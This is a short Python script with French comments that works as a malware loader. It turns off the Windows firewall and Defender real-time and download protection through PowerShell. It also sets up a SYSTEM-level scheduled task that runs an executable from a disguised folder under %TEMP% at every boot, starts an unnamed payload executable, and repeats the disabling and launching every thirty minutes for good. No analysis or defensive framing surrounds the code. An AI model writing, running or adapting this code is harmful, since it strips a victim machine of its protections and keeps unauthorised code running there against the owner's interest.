import subprocess 
import time 

disableav = "powershell ; Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled false ; Set-MpPreference -DIsableRealTimeMonitoring $true ; Set-MpPreference -DisableIOAVProtection $true  "
percist = 'schtasks /create /RU SYSTEM /SC onstart /F /TN "Enable" /TR "%TEMP%\WindowsNT\NTSystem\Enable.exe"'
runpayload = 'start 23592.exe'
#demarrage
subprocess.Popen(str(disableav) ,shell=True)
time.sleep(45)
subprocess.Popen(percist ,shell=True)
subprocess.Popen(runpayload ,shell=True)

# 2eme fois
time.sleep(300)
subprocess.Popen(str(disableav) ,shell=True)
time.sleep(45)
subprocess.Popen(runpayload ,shell=True)

#boucle
while True:
	time.sleep(1800)
	subprocess.Popen(str(disableav) ,shell=True)
	time.sleep(45)
	subprocess.Popen(runpayload ,shell=True)

#boucle